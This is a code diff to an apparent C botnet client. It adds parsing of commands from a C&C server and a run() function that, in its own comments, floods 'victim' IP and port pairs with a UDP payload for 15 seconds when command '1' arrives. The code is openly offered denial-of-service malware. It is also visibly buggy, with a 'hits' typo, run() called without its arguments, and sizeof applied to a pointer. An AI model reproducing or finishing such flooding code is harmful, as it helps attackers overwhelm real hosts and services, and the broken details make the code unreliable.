@@ -7,6 +7,7 @@
 #include <string.h>
 #include <netdb.h>
 #include <netinet/in.h>
+#include <sys/time.h>
 
 #define MESSAGE_MAXLEN 512
 #define PORTLEN 22
@@ -21,6 +22,7 @@ struct pairs{
 struct msg{
 	char command;
 	struct pairs entries[20];
+	int number_of_pairs;
 };
 
 // usage
@@ -33,14 +35,17 @@ void parse_packet(struct msg *message, char *packet, int bytes_recv){
 	int i = PORTLEN + INET_ADDRSTRLEN;
 	bytes_recv--; // decrementing by size of char command
 	int counter = bytes_recv / i;
+
 	message->command = *packet++;
-	printf("%s\n", message->command);
+
 	for(i = 0; i < counter; i++){
 		strcpy(message->entries[i].ip, packet);
 		packet += sizeof(message->entries[i].ip);
 		strcpy(message->entries[i].port, packet);
 		packet += sizeof(message->entries[i].port);
 	}
+
+	message->number_of_pairs = counter;
 }
 
 /*
@@ -82,6 +87,56 @@ void prog(struct msg *message, char *payload){
 	int bytes_recv = recvfrom(sock, payload, sizeof(payload), 0, NULL, NULL);
 
 	printf("%s\n", payload);
+}
+
+/*
+	bot starts sending payload which it received from UDP_server
+	to victim processes with ip addresses and ports which it received from 
+	C&C server
+*/ 
+void run(struct msg *message, char *payload){
+
+	struct timeval tstart;
+	struct timeval tend;
+
+	int i;
+
+	char *target_ip;
+	char *target_port;
+
+	struct addrinfo *target;
+	struct addrinfo hints;
+
+	memset(&hints, 0, sizeof(hints));
+	hits.ai_socktype = SOCK_DGRAM;
+
+	int sock;
+	sock = socket(PF_INET, SOCK_DGRAM, 0);
+
+	if(sock < 0){
+		err(2, "socket error\n");
+	}
+
+	int gai_error;
+
+	// send payload for 15 seconds
+	gettimeofday(&tstart, NULL);
+	gettimeofday(&tend, NULL);
+
+	while(tend.tv_sec - tstart.tv_sec < 15){
+		for(i = 0; i < message->number_of_pairs; ++i){
+			target_ip = message->entries[i].ip;
+			target_port = message->entries[i].port;
+
+			if((gai_error = getaddrinfo(target_ip, target_port, &hints, &target)) != 0){
+				err(3, "getaddrinfo() failed. %s\n", gai_strerror(gai_error));
+			}
+
+			int bytes_sent = sendto(sock, payload, sizeof(payload), 0, target->ai_addr, target->ai_addrlen);
+		}
+
+		gettimeofday(&tend, NULL);
+	}
 }
 
 int main(int argc, char **argv){
@@ -142,6 +197,13 @@ int main(int argc, char **argv){
 		to which the payload is going to be sent
 	*/
 
+	int bytes_recv = recvfrom(sock, packet, sizeof(packet), 0, NULL, NULL);
+
+	parse_packet(&message, packet, bytes_recv);
+
+	if(message.command == '1'){
+		run();
+	}
 
 
 	freeaddrinfo(server_address);
